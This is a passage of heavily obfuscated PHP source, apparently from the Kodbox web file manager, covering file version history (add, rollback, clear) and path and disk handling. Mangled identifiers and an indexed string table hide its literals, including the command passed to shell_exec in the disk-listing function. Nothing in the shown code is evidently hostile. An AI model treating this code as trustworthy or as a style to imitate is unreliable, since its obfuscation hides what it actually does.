self::parsePath($Ä”óãû); if (!$×ø´†è) { continue; } foreach ($‘¿¼âç„ as $ïª¶¬ö) { $é¶œ™Œ = self::listData(rtrim($×ø´†è, $ÆÓ²âÆ[8]) . $ÆÓ²âÆ[8] . $ïª¶¬ö, !1); if ($é¶œ™Œ && $é¶œ™Œ[$ÆÓ²âÆ[378]]) { $úğˆ½ˆÍ[rtrim($Ä”óãû, $ÆÓ²âÆ[8]) . $ÆÓ²âÆ[8] . $ïª¶¬ö] = count($é¶œ™Œ[$ÆÓ²âÆ[378]]); } } } return $úğˆ½ˆÍ; } public static function add($óòÅŠñØ) { $—×“Ù½• =& $_SERVER[ Ö‘ñÄ”]; $ÄŒêë­ = self::listData($óòÅŠñØ); if (!$ÄŒêë­) { return; } $Åµš¨“› = Model($—×“Ù½•[783])->get($—×“Ù½•[1237]); $¥ıë˜¹ = $GLOBALS[$—×“Ù½•[6]][$—×“Ù½•[89]][$—×“Ù½•[1215]]; $èµòÊâ = $Åµš¨“› == $—×“Ù½•[1238] ? min(5, $¥ıë˜¹) : $¥ıë˜¹; if ($¥ıë˜¹ <= 0) { return; } $´ÎÆˆÄÀ = IO::info($óòÅŠñØ); $¤À÷ğŸº = $ÄŒêë­[$—×“Ù½•[378]]; if ($´ÎÆˆÄÀ[$—×“Ù½•[76]] == 0) { return; } if ($´ÎÆˆÄÀ[$—×“Ù½•[76]] >= 1024 * 1024 * 500) { return !1; } $®ıÔø¹ì = IO::hashSimple($óòÅŠñØ); if ($¤À÷ğŸº && $¤À÷ğŸº[0][$—×“Ù½•[177]] == $®ıÔø¹ì) { return !0; } if (array_key_exists($—×“Ù½•[202], $´ÎÆˆÄÀ) && !$´ÎÆˆÄÀ[$—×“Ù½•[202]]) { return !1; } $Òª“†òœ = short_id(time()); $¬Òñå“½ = array($—×“Ù½•[407] => $Òª“†òœ, $—×“Ù½•[177] => $®ıÔø¹ì, $—×“Ù½•[32] => $´ÎÆˆÄÀ[$—×“Ù½•[32]] . $—×“Ù½•[10] . date($—×“Ù½•[1239]) . rand_string(1), $—×“Ù½•[76] => $´ÎÆˆÄÀ[$—×“Ù½•[76]], $—×“Ù½•[462] => USER_ID, $—×“Ù½•[200] => time(), $—×“Ù½•[1240] => $—×“Ù½•[12]); IO::mkdir($ÄŒêë­[$—×“Ù½•[1241]]); $«½µÀ©Ø = IO::copy($óòÅŠñØ, $ÄŒêë­[$—×“Ù½•[1241]], !1, $¬Òñå“½[$—×“Ù½•[32]]); if (!$«½µÀ©Ø) { self::clearEmptyFolder($ÄŒêë­[$—×“Ù½•[1241]]); return !1; } array_unshift($¤À÷ğŸº, $¬Òñå“½); if (count($¤À÷ğŸº) > $èµòÊâ) { $¥Ç™ğ¤¿ = array_slice($¤À÷ğŸº, $èµòÊâ); foreach ($¥Ç™ğ¤¿ as $¹†õ…¨Û) { IO::remove($ÄŒêë­[$—×“Ù½•[1241]] . $¹†õ…¨Û[$—×“Ù½•[32]]); } $¤À÷ğŸº = array_slice($¤À÷ğŸº, 0, $èµòÊâ); } return self::saveData($ÄŒêë­[$—×“Ù½•[1242]], $¤À÷ğŸº); } public static function remove($Á¹ÎÖ»‰, $ØÖÅ×š) { $åÄ‡¤‚ =& $_SERVER[ Ö‘ñÄ”]; $ŞÊ·ÒÃÉ = self::listData($Á¹ÎÖ»‰); $€ºÒŸ„ğ = array(); if (!$ŞÊ·ÒÃÉ) { return !1; } foreach ($ŞÊ·ÒÃÉ[$åÄ‡¤‚[378]] as $´ìğÆ¹ù) { if ($´ìğÆ¹ù[$åÄ‡¤‚[407]] == $ØÖÅ×š) { IO::remove($ŞÊ·ÒÃÉ[$åÄ‡¤‚[1241]] . $´ìğÆ¹ù[$åÄ‡¤‚[32]]); continue; } $€ºÒŸ„ğ[] = $´ìğÆ¹ù; } return self::saveData($ŞÊ·ÒÃÉ[$åÄ‡¤‚[1242]], $€ºÒŸ„ğ); } public static function clear($°üéòğı, $å£—ú¼ = true) { $–ÌçÒá =& $_SERVER[ Ö‘ñÄ”]; $‘Û‰šŠ = self::listData($°üéòğı, $å£—ú¼); if (!$‘Û‰šŠ) { return !1; } foreach ($‘Û‰šŠ[$–ÌçÒá[378]] as $ÂÖœŞ³ë) { IO::remove($‘Û‰šŠ[$–ÌçÒá[1241]] . $ÂÖœŞ³ë[$–ÌçÒá[32]]); } return self::saveData($‘Û‰šŠ[$–ÌçÒá[1242]], array()); } public static function moveHistory($•õš—Ã‡, $¸Î¿€éş = '', $’òÛõïı = '') { $›‹Ÿ¦´÷ =& $_SERVER[ Ö‘ñÄ”]; $¿±·½ä  = self::listData($•õš—Ã‡, !1); if (!$¿±·½ä  || !$¿±·½ä [$›‹Ÿ¦´÷[378]]) { return !1; } $ıÆ¥Ş± = $›‹Ÿ¦´÷[1229]; $¸Î¿€éş = $¸Î¿€éş ? $¸Î¿€éş : get_path_this($•õš—Ã‡); $’òÛõïı = $’òÛõïı ? $’òÛõïı : $¿±·½ä [$›‹Ÿ¦´÷[1241]]; $°½óåü = substr(get_path_this($¿±·½ä [$›‹Ÿ¦´÷[1242]]), 0, -strlen($ıÆ¥Ş±)); foreach ($¿±·½ä [$›‹Ÿ¦´÷[378]] as $Ù„®ºŸ => $ÌÀì«×‹) { $‹óëöÎÌ = $¸Î¿€éş . substr($ÌÀì«×‹[$›‹Ÿ¦´÷[32]], strlen($°½óåü)); $½ïÉÑ„İ = IO::move($¿±·½ä [$›‹Ÿ¦´÷[1241]] . $ÌÀì«×‹[$›‹Ÿ¦´÷[32]], $’òÛõïı, !1, $‹óëöÎÌ); if ($½ïÉÑ„İ) { $¿±·½ä [$›‹Ÿ¦´÷[378]][$Ù„®ºŸ][$›‹Ÿ¦´÷[32]] = $‹óëöÎÌ; } } $¿±·½ä [$›‹Ÿ¦´÷[1242]] = IO::move($¿±·½ä [$›‹Ÿ¦´÷[1242]], $’òÛõïı, !1, $¸Î¿€éş . $ıÆ¥Ş±); self::saveData($¿±·½ä [$›‹Ÿ¦´÷[1242]], $¿±·½ä [$›‹Ÿ¦´÷[378]]); self::clearEmptyFolder($¿±·½ä [$›‹Ÿ¦´÷[1241]]); } public static function rollback($œ«Â­œÂ, $™äúÑ) { $Ìä”‡À =& $_SERVER[ Ö‘ñÄ”]; $•ÓªØí· = self::listData($œ«Â­œÂ); if (!$•ÓªØí·) { return; } $€š±¶½ñ = IO::info($œ«Â­œÂ); foreach ($•ÓªØí·[$Ìä”‡À[378]] as $ÜƒäòÛ¹ => $Ô¸Ğ¯£†) { if ($Ô¸Ğ¯£†[$Ìä”‡À[407]] == $™äúÑ) { self::add($œ«Â­œÂ); $È‘ùêò¼ = $•ÓªØí·[$Ìä”‡À[1241]] . $Ô¸Ğ¯£†[$Ìä”‡À[32]]; $‚î¬‹Œ = IO::copy($È‘ùêò¼, IO::pathFather($œ«Â­œÂ), REPEAT_REPLACE, $€š±¶½ñ[$Ìä”‡À[32]]); if ($‚î¬‹Œ) { self::remove($œ«Â­œÂ, $™äúÑ); } return $‚î¬‹Œ; } } return !1; } public static function setDetail($­†ŞØÎò, $…„şè˜ê, $÷Şû‹û) { $®ù¦¤¸ =& $_SERVER[ Ö‘ñÄ”]; $¡¥†ÕÉ¤ = self::listData($­†ŞØÎò); if (!$¡¥†ÕÉ¤) { return; } foreach ($¡¥†ÕÉ¤[$®ù¦¤¸[378]] as $çÑ‹±™¥ => $ì„¨à£) { if ($ì„¨à£[$®ù¦¤¸[407]] == $…„şè˜ê) { $¡¥†ÕÉ¤[$®ù¦¤¸[378]][$çÑ‹±™¥][$®ù¦¤¸[1240]] = $÷Şû‹û; self::saveData($¡¥†ÕÉ¤[$®ù¦¤¸[1242]], $¡¥†ÕÉ¤[$®ù¦¤¸[378]]); return !0; } } return !1; } public static function fileInfo($‘”Ç ŒÊ, $Æ—îî«) { $¤“‡¤ôŸ =& $_SERVER[ Ö‘ñÄ”]; $ç×òæÚİ = self::listData($‘”Ç ŒÊ); if (!$ç×òæÚİ) { show_json(LNG($¤“‡¤ôŸ[105]), !1); } $˜Êö ¦ = $¤“‡¤ôŸ[12]; foreach ($ç×òæÚİ[$¤“‡¤ôŸ[378]] as $ø‚ù†ş÷ => $½Ï­œáÚ) { if ($½Ï­œáÚ[$¤“‡¤ôŸ[407]] != $Æ—îî«) { continue; } $˜Êö ¦ = $ç×òæÚİ[$¤“‡¤ôŸ[1241]] . $½Ï­œáÚ[$¤“‡¤ôŸ[32]]; break; } if (!$˜Êö ¦) { show_json(LNG($¤“‡¤ôŸ[105]), !1); } return IO::info($˜Êö ¦); } public static function fileOut($Ï½Ò€Ãñ, $¹İĞ´’, $‚—áÒ¸± = false) { $¼ÄŒÑ½Õ =& $_SERVER[ Ö‘ñÄ”]; $÷éŒ€ÊÃ = self::fileInfo($Ï½Ò€Ãñ, $¹İĞ´’); $İÛŒŒÑë =& $GLOBALS[$¼ÄŒÑ½Õ[7]]; $‚—áÒ¸± = isset($İÛŒŒÑë[$¼ÄŒÑ½Õ[1205]]) && $İÛŒŒÑë[$¼ÄŒÑ½Õ[1205]] == 1; if (isset($İÛŒŒÑë[$¼ÄŒÑ½Õ[33]]) && $İÛŒŒÑë[$¼ÄŒÑ½Õ[33]] == $¼ÄŒÑ½Õ[1243]) { return IO::fileOutImage($÷éŒ€ÊÃ[$¼ÄŒÑ½Õ[84]], $İÛŒŒÑë[$¼ÄŒÑ½Õ[1244]]); } IO::fileOut($÷éŒ€ÊÃ[$¼ÄŒÑ½Õ[84]], $‚—áÒ¸±, get_path_this($Ï½Ò€Ãñ)); } public static function listData($êÂòõ, $ŒÚ÷¸Ê = true) { $öÍÖÁ€¯ =& $_SERVER[ Ö‘ñÄ”]; if ($ŒÚ÷¸Ê && !IO::exist($êÂòõ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($êÂòõ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÂÄšé‚´ = self::pathHistory($êÂòõ); $€¾êº§ø = array($öÍÖÁ€¯[1242] => $ÂÄšé‚´ . $öÍÖÁ€¯[1229], $öÍÖÁ€¯[1241] => rtrim(get_path_father($ÂÄšé‚´), $öÍÖÁ€¯[8]) . $öÍÖÁ€¯[8], $öÍÖÁ€¯[378] => array()); $Ù·¯Êˆí = IO::getContent($€¾êº§ø[$öÍÖÁ€¯[1242]]); if ($Ù·¯Êˆí) { $¿·€öÚ¥ = json_decode($Ù·¯Êˆí, !0); if (is_array($¿·€öÚ¥)) { $€¾êº§ø[$öÍÖÁ€¯[378]] = $¿·€öÚ¥; } } return $€¾êº§ø; } private static function saveData($ÎÓÇÃóĞ, $½ôÔ÷ß) { $µÍ¨€¦× =& $_SERVER[ Ö‘ñÄ”]; self::log($µÍ¨€¦×[1245] . $ÎÓÇÃóĞ . $µÍ¨€¦×[71] . count($½ôÔ÷ß), $µÍ¨€¦×[765]); if ($½ôÔ÷ß) { return IO::setContent($ÎÓÇÃóĞ, json_encode($½ôÔ÷ß)); } $äÉšÓè· = IO::pathFather($ÎÓÇÃóĞ); IO::remove($ÎÓÇÃóĞ); self::clearEmptyFolder($äÉšÓè·); return !0; } public static function clearEmptyFolder($£ñˆ‘åí) { $Ïªüƒ•« =& $_SERVER[ Ö‘ñÄ”]; if (trim($£ñˆ‘åí, $Ïªüƒ•«[8]) == trim(self::$_historyBase, $Ïªüƒ•«[8])) { return; } $àşÛõ®Ï = IO::pathFather($£ñˆ‘åí); $íÖÌ’Ì„ = IO::has($£ñˆ‘åí, !0); if ($íÖÌ’Ì„[$Ïªüƒ•«[207]] > 0 || $íÖÌ’Ì„[$Ïªüƒ•«[208]] > 0) { return; } IO::remove($£ñˆ‘åí); self::clearEmptyFolder($àşÛõ®Ï); } private static function getBasePath() { $¯òá‘‹é =& $_SERVER[ Ö‘ñÄ”]; $°ê¬¸ö = Model($¯òá‘‹é[1246])->get($¯òá‘‹é[1247]); if ($°ê¬¸ö) { if (!IO::exist($°ê¬¸ö)) { IO::mkdir($°ê¬¸ö); } if (get_path_this($°ê¬¸ö) == $¯òá‘‹é[1232]) { $éøìá¶ = $¯òá‘‹é[1248] . rand_string(8); @rename($°ê¬¸ö, get_path_father($°ê¬¸ö) . $¯òá‘‹é[8] . $éøìá¶); $°ê¬¸ö = DATA_PATH . $éøìá¶ . $¯òá‘‹é[8]; file_put_contents(DATA_PATH . $¯òá‘‹é[1249], $¯òá‘‹é[12]); Model($¯òá‘‹é[1246])->set($¯òá‘‹é[1247], $°ê¬¸ö); } return $°ê¬¸ö; } $°ê¬¸ö = DATA_PATH . $¯òá‘‹é[1248] . rand_string(8) . $¯òá‘‹é[8]; $°ê¬¸ö = IO::mkdir($°ê¬¸ö); $°ê¬¸ö = rtrim($°ê¬¸ö, $¯òá‘‹é[8]) . $¯òá‘‹é[8]; file_put_contents($°ê¬¸ö . $¯òá‘‹é[1249], $¯òá‘‹é[12]); file_put_contents(DATA_PATH . $¯òá‘‹é[1249], $¯òá‘‹é[12]); Model($¯òá‘‹é[1246])->set($¯òá‘‹é[1247], $°ê¬¸ö); return $°ê¬¸ö; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\145\143\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\151\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\x69\x6c\145\124\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\160\122\157\157\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\x73\x65\x72\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\x72\x53\x68\x61\162\145\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\145\124\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\162\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\x49\164\x65\155\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\173\163\x65\x61\x72\x63\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\162\x52\145\x6e\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\145\162\x7d"; public static function typeList() { $ˆê©±õ„ =& $_SERVER[ Ö‘ñÄ”]; return array($ˆê©±õ„[1250] => self::KOD_SOURCE, $ˆê©±õ„[1251] => self::KOD_USER_RECYCLE, $ˆê©±õ„[1252] => self::KOD_USER_FAV, $ˆê©±õ„[1253] => self::KOD_USER_FILE_TAG, $ˆê©±õ„[1254] => self::KOD_USER_FILE_TYPE, $ˆê©±õ„[1255] => self::KOD_GROUP_ROOT_SELF, $ˆê©±õ„[1256] => self::KOD_USER_SHARE, $ˆê©±õ„[1257] => self::KOD_USER_SHARE_LINK, $ˆê©±õ„[1258] => self::KOD_USER_SHARE_TO_ME, $ˆê©±õ„[1259] => self::KOD_SHARE_ITEM, $ˆê©±õ„[1260] => self::KOD_SHARE_LINK, $ˆê©±õ„[1261] => self::KOD_SEARCH, $ˆê©±õ„[1262] => self::KOD_BLOCK, $ˆê©±õ„[1263] => self::KOD_IO, $ˆê©±õ„[1264] => self::KOD_USER_RECENT, $ˆê©±õ„[1265] => self::KOD_USER_DRIVER); } public static function parse($Ù±‰†Ë) { $¢¤é…÷¿ =& $_SERVER[ Ö‘ñÄ”]; $Ù±‰†Ë = self::clear($Ù±‰†Ë); $æÆ¤ß™ = array_values(self::typeList()); preg_match($¢¤é…÷¿[1266], $Ù±‰†Ë, $¢”³ßë); $ïà•·½ = array($¢¤é…÷¿[430] => !1, $¢¤é…÷¿[1267] => !1, $¢¤é…÷¿[427] => !1, $¢¤é…÷¿[84] => $Ù±‰†Ë, $¢¤é…÷¿[1176] => !1, $¢¤é…÷¿[1175] => $¢¤é…÷¿[12]); if (is_array($¢”³ßë) && count($¢”³ßë) == 5) { $Üêˆé£ = $¢¤é…÷¿[1268] . $¢”³ßë[2] . $¢¤é…÷¿[336]; if (in_array($Üêˆé£, $æÆ¤ß™)) { $ïà•·½[$¢¤é…÷¿[1176]] = $¢”³ßë[1]; $ïà•·½[$¢¤é…÷¿[33]] = $Üêˆé£; $ïà•·½[$¢¤é…÷¿[1269]] = substr($Üêˆé£, 1, -1); $ïà•·½[$¢¤é…÷¿[407]] = $¢”³ßë[3]; } $ïà•·½[$¢¤é…÷¿[1175]] = $¢”³ßë[4]; } $šï Àğ‰ = array($¢¤é…÷¿[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ïà•·½[$¢¤é…÷¿[1231]] = in_array($ïà•·½[$¢¤é…÷¿[33]], $šï Àğ‰); return $ïà•·½; } public static function isTruePath($ÆöáË›) { $ëı¶á£ =& $_SERVER[ Ö‘ñÄ”]; if (substr($ÆöáË›, 0, 1) != $ëı¶á£[1268]) { return !0; } if (strpos($ÆöáË›, $ëı¶á£[416]) === 0) { return !0; } if (strpos($ÆöáË›, $ëı¶á£[1235]) === 0) { return !0; } if (strpos($ÆöáË›, $ëı¶á£[1270]) === 0) { return !0; } if (strpos($ÆöáË›, $ëı¶á£[1271]) === 0) { return !0; } if (strpos($ÆöáË›, $ëı¶á£[1272]) === 0) { return !0; } return !1; } public static function clear($¡úƒˆõ) { $µ°·úïÈ =& $_SERVER[ Ö‘ñÄ”]; $¡úƒˆõ = str_replace(array($µ°·úïÈ[1084], $µ°·úïÈ[231]), $µ°·úïÈ[53], $¡úƒˆõ); $¡úƒˆõ = str_replace($µ°·úïÈ[97], $µ°·úïÈ[8], $¡úƒˆõ); $³ÈŠ²­£ = $µ°·úïÈ[1273]; if (substr($¡úƒˆõ, 0, 3) == $µ°·úïÈ[1274]) { $¡úƒˆõ = substr($¡úƒˆõ, 3); } while (strstr($¡úƒˆõ, $³ÈŠ²­£)) { $¡úƒˆõ = str_replace($³ÈŠ²­£, $µ°·úïÈ[8], $¡úƒˆõ); } $¡úƒˆõ = preg_replace($µ°·úïÈ[1275], $µ°·úïÈ[8], $¡úƒˆõ); if ($¡úƒˆõ == $µ°·úïÈ[8]) { return $µ°·úïÈ[8]; } $¡úƒˆõ = rtrim($¡úƒˆõ, $µ°·úïÈ[8]); return $¡úƒˆõ; } public static function sourceID($§²ßóŒ¸) { $ŞÑÀÔ‰É =& $_SERVER[ Ö‘ñÄ”]; $ÉØ²¹Öñ = self::parse($§²ßóŒ¸); if ($ÉØ²¹Öñ[$ŞÑÀÔ‰É[33]] !== self::KOD_SOURCE) { show_json(LNG($ŞÑÀÔ‰É[1276]), !1); } return $ÉØ²¹Öñ[$ŞÑÀÔ‰É[407]]; } public static function make($Äºš˜­ì) { if (!$Äºš˜­ì) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Äºš˜­ì)); } public static function makeShare($½€óóÙû, $–àÅÁ¸Ë) { return self::makePath(self::KOD_SHARE_ITEM, $½€óóÙû, $–àÅÁ¸Ë); } public static function makeFileTypePath($Œ‰¯á¡) { return self::makePath(self::KOD_USER_FILE_TYPE, $Œ‰¯á¡); } public static function makeFileTagPath($ïÖ»ıÀâ) { return self::makePath(self::KOD_USER_FILE_TAG, $ïÖ»ıÀâ); } public static function makePath($Şø¨˜¦µ, $ìŒ„¡Ş = '', $–Ê³ÆËñ = '') { $¢µ­ØÌú =& $_SERVER[ Ö‘ñÄ”]; $½ô¿·İê = substr($Şø¨˜¦µ, 1, -1); $‰ŠÔ¬• = $¢µ­ØÌú[1277] . $½ô¿·İê . $¢µ­ØÌú[1278] . $ìŒ„¡Ş . $¢µ­ØÌú[1279]; $‰ŠÔ¬• = $–Ê³ÆËñ ? $‰ŠÔ¬• . $–Ê³ÆËñ . $¢µ­ØÌú[8] : $‰ŠÔ¬•; return $‰ŠÔ¬•; } public static function hashPath($»·ı™Í, $ñ‹õ í‘ = true) { $´‰¯•ä© =& $_SERVER[ Ö‘ñÄ”]; $ÂÒ²ë»ä = is_array($»·ı™Í) ? $»·ı™Í : IO::info($»·ı™Í); $òè‰Ìæî = _get($ÂÒ²ë»ä, $´‰¯•ä©[1280], $´‰¯•ä©[12]); if (!$òè‰Ìæî && isset($ÂÒ²ë»ä[$´‰¯•ä©[410]])) { $ÂÒ²ë»ä = IO::info(KodIO::make($ÂÒ²ë»ä[$´‰¯•ä©[410]])); $òè‰Ìæî = _get($ÂÒ²ë»ä, $´‰¯•ä©[1280], $´‰¯•ä©[12]); } if (!$òè‰Ìæî && $ñ‹õ í‘) { $ƒ…»©çğ = KodIO::parse($ÂÒ²ë»ä[$´‰¯•ä©[84]]); if (!$ƒ…»©çğ[$´‰¯•ä©[33]]) { $òè‰Ìæî = IO::hashSimple($ÂÒ²ë»ä[$´‰¯•ä©[84]]); } } if (!$òè‰Ìæî) { $òè‰Ìæî = md5($ÂÒ²ë»ä[$´‰¯•ä©[84]] . $ÂÒ²ë»ä[$´‰¯•ä©[76]] . $ÂÒ²ë»ä[$´‰¯•ä©[85]]); } return $òè‰Ìæî; } public static function initSystemPath() { $ßşŒŸş† =& $_SERVER[ Ö‘ñÄ”]; if (defined($ßşŒŸş†[1281])) { return; } define($ßşŒŸş†[1281], self::systemPath($ßşŒŸş†[1282])); define($ßşŒŸş†[1283], self::systemPath($ßşŒŸş†[1284])); define($ßşŒŸş†[1285], self::systemPath($ßşŒŸş†[1286])); define($ßşŒŸş†[1287], self::systemPath($ßşŒŸş†[1288])); IOHistory::bindEvent(); } public static function systemPath($‡‡‚ƒ±) { $»êîêÛé =& $_SERVER[ Ö‘ñÄ”]; $²âÀØç¡ = $»êîêÛé[1289] . ucfirst($‡‡‚ƒ±); $„‘ÁÉò = Model($»êîêÛé[783])->get($²âÀØç¡); if ($„‘ÁÉò) { return $„‘ÁÉò; } if ($‡‡‚ƒ± == $»êîêÛé[1282]) { $„‘ÁÉò = self::make(Model($»êîêÛé[838])->systemRootPathAdd($»êîêÛé[552])); } else { $„‘ÁÉò = self::systemPath($»êîêÛé[1282]); $˜±é‘ù‰ = self::sourceID($„‘ÁÉò); $„‘ÁÉò = self::make(Model($»êîêÛé[838])->mkdir($˜±é‘ù‰, $‡‡‚ƒ±)); } Model($»êîêÛé[783])->set($²âÀØç¡, $„‘ÁÉò); return $„‘ÁÉò; } public static function systemFolder($ÏÂ³Æ­) { $Ùğ§ä–À = IO_PATH_SYSTEM_SOURCE . $ÏÂ³Æ­; $‡Õ±® = Cache::get($Ùğ§ä–À); if (!$‡Õ±®) { $´Òï—Æ = IO::infoFull($Ùğ§ä–À); if (!$´Òï—Æ) { $‡Õ±® = IO::mkdir($Ùğ§ä–À, REPEAT_SKIP); } else { $‡Õ±® = $´Òï—Æ[$_SERVER[ Ö‘ñÄ”][84]]; } Cache::set($Ùğ§ä–À, $‡Õ±®, 3600 * 10); } return $‡Õ±®; } public static function defaultDriver() { return Model($_SERVER[ Ö‘ñÄ”][780])->defaultDriver(); } public static function defaultIO() { $ş¾Ö¶ =& $_SERVER[ Ö‘ñÄ”]; $Ûİ¬í‚‚ = self::defaultDriver(); return $ş¾Ö¶[1290] . $Ûİ¬í‚‚[$ş¾Ö¶[407]] . $ş¾Ö¶[1279]; } public static function defaultDriverInit() { static $¥µĞšù = false; if ($¥µĞšù) { return $¥µĞšù; } $¥µĞšù = IO::init(self::defaultIO()); return $¥µĞšù; } public static function fileTypeList() { $Ò°„šüä =& $_SERVER[ Ö‘ñÄ”]; $ôŸº’¾ = $GLOBALS[$Ò°„šüä[6]][$Ò°„šüä[1291]]; foreach ($ôŸº’¾ as $‰×¢’‹ƒ => $²Ãö–æ») { $¾çö³Í½ = $Ò°„šüä[1292] . $‰×¢’‹ƒ; $»Ùº•Å = LNG($¾çö³Í½); if ($¾çö³Í½ != $»Ùº•Å) { $ôŸº’¾[$‰×¢’‹ƒ][$Ò°„šüä[32]] = $»Ùº•Å; } } return $ôŸº’¾; } public static function diskList($æ±§æÜ = true) { $Íœ¾ÔëÂ = $_SERVER[ Ö‘ñÄ”][1293]; if ($æ±§æÜ) { $½çœ‰öÛ = Cache::get($Íœ¾ÔëÂ); if (is_array($½çœ‰öÛ)) { return $½çœ‰öÛ; } } $½çœ‰öÛ = self::diskListGet(); Cache::set($Íœ¾ÔëÂ, $½çœ‰öÛ, 60); return $½çœ‰öÛ; } public static function diskListGet() { $ì³ùµËÁ =& $_SERVER[ Ö‘ñÄ”]; $ş¯¿¤Ã = array(); if ($GLOBALS[$ì³ùµËÁ[6]][$ì³ùµËÁ[1294]] == $ì³ùµËÁ[1295]) { $ëş·§ƒ = $ì³ùµËÁ[1296]; for ($‡ãÙ¦¹ = 0; $‡ãÙ¦¹ < strlen($ëş·§ƒ); $‡ãÙ¦¹++) { $éÍ±‰¼ù = $ëş·§ƒ[$‡ãÙ¦¹] . $ì³ùµËÁ[1297]; if (file_exists($éÍ±‰¼ù)) { $ş¯¿¤Ã[] = $éÍ±‰¼ù; } } return $ş¯¿¤Ã; } if (!function_exists($ì³ùµËÁ[98])) { $ş¯¿¤Ã[] = $ì³ùµËÁ[848]; return $ş¯¿¤Ã; } $Î…á–öÔ = explode($ì³ùµËÁ[231], shell_exec($ì³ùµËÁ[1298])); array_shift($Î…á–öÔ); array_pop($Î…á–öÔ); $·â‡Üğ = array($ì³ùµËÁ[1299], $ì³ùµËÁ[1300], $ì³ùµËÁ[1301], $ì³ùµËÁ[1302], $ì³ùµËÁ[1303], $ì³ùµËÁ[1304], $ì³ùµËÁ[1305], $ì³ùµËÁ[1306]); foreach ($Î…á–öÔ as $èµçãÙ) { $¬“¤ºÓí = preg_split($ì³ùµËÁ[1307], $èµçãÙ); $éÍ±‰¼ù = $¬“¤ºÓí[count($¬“¤ºÓí) - 1]; if (!strstr($¬“¤ºÓí[0], $ì³ùµËÁ[1308]) || !$éÍ±‰¼ù) { continue; } $¸•’¤Á = rtrim($éÍ±‰¼ù, $ì³ùµËÁ[8]) . $ì³ùµËÁ[8]; if (in_array($¸•’¤Á, $·â‡Üğ)) { continue; } $ş¯¿¤Ã[] = $¸•’¤Á; } return $ş¯¿¤Ã; } public static function isSameDisk($šû®ßüË, $Ç¶¤¦ Õ) { $±ºòÜéÆ =& $_SERVER[ Ö‘ñÄ”]; if ($GLOBALS[$±ºòÜéÆ[6]][$±ºòÜéÆ[1294]] == $±ºòÜéÆ[1295]) { return strtolower(substr($šû®ßüË, 0, 1)) == strtolower(substr($Ç¶¤¦ Õ, 0, 1)); } $èªŠ¾ë« = self::diskList(); $åõ¬ˆáŒ = !1; $ÒĞ…”Ï¶ = !1; sort($èªŠ¾ë«); $èªŠ¾ë« = array_reverse($èªŠ¾ë«); $šû®ßüË = rtrim($šû®ßüË, $±ºòÜéÆ[8]) . $±ºòÜéÆ[8]; $Ç¶¤¦ Õ = rtrim($Ç¶¤¦ Õ, $±ºòÜéÆ[8]) . $±ºòÜéÆ[8]; foreach ($èªŠ¾ë« as $­õşòë¾) { $Å¢¦Ï™× = strlen($­õşòë¾); if (!$åõ¬ˆáŒ && substr($šû®ßüË, 0, $Å¢¦Ï™×) == $­õşòë¾) { $åõ¬ˆáŒ = $­õşòë¾; } if (!$ÒĞ…”Ï¶ && substr($Ç¶¤¦ Õ, 0, $Å¢¦Ï™×) == $­õşòë¾) { $ÒĞ…”Ï¶ = $­õşòë¾; } if ($åõ¬ˆáŒ && $ÒĞ…”Ï¶) { break; } } return $åõ¬ˆáŒ === $ÒĞ…”Ï¶; } public static function transferType($Ãˆ×¦¸Ÿ, $…şª€Å¯) { $À‡÷ï£µ =& $_SERVER[ Ö‘ñÄ”]; $”€ÙõŞ£ = self::driverType($Ãˆ×¦¸Ÿ); $ÈîîÅ—ñ = self::driverType($…şª€Å¯); if ($”€ÙõŞ£[$À‡÷ï£µ[33]] == $ÈîîÅ—ñ[$À‡÷ï£µ[33]] && $”€ÙõŞ£[$À‡÷ï£µ[1309]] == $ÈîîÅ—ñ[$À‡÷ï£µ[1309]]) { return $À‡÷ï£µ[1310]; } if ($”€ÙõŞ£[$À‡÷ï£µ[33]] == $À‡÷ï£µ[877] && $ÈîîÅ—ñ[$À‡÷ï£µ[33]] == $À‡÷ï£µ[106]) { return $À‡÷ï£µ[1205]; } if ($”€ÙõŞ£[$À‡÷ï£µ[33]] == $À‡÷ï£µ[106] && $ÈîîÅ—ñ[$À‡÷ï£µ[33]] == $À‡÷ï£µ[877]) { return $À‡÷ï£µ[107]; } return $À‡÷ï£µ[1311]; } public static function driverType($‡´ëŠò) { $Õ†ñï¬ñ =& $_SERVER[ Ö‘ñÄ”]; $·›Äï…œ = str_replace($Õ†ñï¬ñ[1312], $Õ†ñï¬ñ[12], strtolower($‡´ëŠò->getType())); if ($·›Äï…œ == $Õ†ñï¬ñ[771] || $·›Äï…œ == $Õ†ñï¬ñ[1313] || $·›Äï…œ == $Õ†ñï¬ñ[1314]) { $‡´ëŠò = self::defaultDriverInit(); } else { if ($·›Äï…œ == $Õ†ñï¬ñ[1212] || $·›Äï…œ == $Õ†ñï¬ñ[1315]) { $‡´ëŠò = IO::init($‡´ëŠò->pathParse[$Õ†ñï¬ñ[1157]]); } } $Ô¢Êá„” = $‡´ëŠò->path; $·›Äï…œ = str_replace($Õ†ñï¬ñ[1312], $Õ†ñï¬ñ[12], strtolower($‡´ëŠò->getType())); if ($·›Äï…œ == 